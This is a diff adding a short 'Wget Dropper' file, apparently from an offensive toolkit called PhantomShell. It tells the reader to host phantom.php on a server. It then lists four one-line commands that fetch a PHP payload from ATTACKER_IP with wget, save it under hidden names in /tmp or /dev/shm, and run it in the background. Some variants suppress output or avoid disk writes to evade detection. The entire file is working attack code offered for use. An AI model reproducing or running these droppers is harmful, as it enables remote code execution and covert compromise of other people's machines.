@@ -1,0 +1,15 @@
+# Wget Dropper
+# Host phantom.php on your HTTP server first:
+# cd PhantomShell && python3 -m http.server 8888
+
+# Basic wget dropper
+wget -q http://ATTACKER_IP:8888/phantom.php -O /tmp/.cache.php && php /tmp/.cache.php &
+
+# With cleanup
+wget -q http://ATTACKER_IP:8888/phantom.php -O /tmp/.c.php && nohup php /tmp/.c.php >/dev/null 2>&1 &
+
+# Minimal loader only
+wget -q http://ATTACKER_IP:8888/loader.php -O /tmp/.l.php && php /tmp/.l.php &
+
+# Hidden in /dev/shm (tmpfs, no disk write)
+wget -q http://ATTACKER_IP:8888/phantom.php -O /dev/shm/.cache && php /dev/shm/.cache &
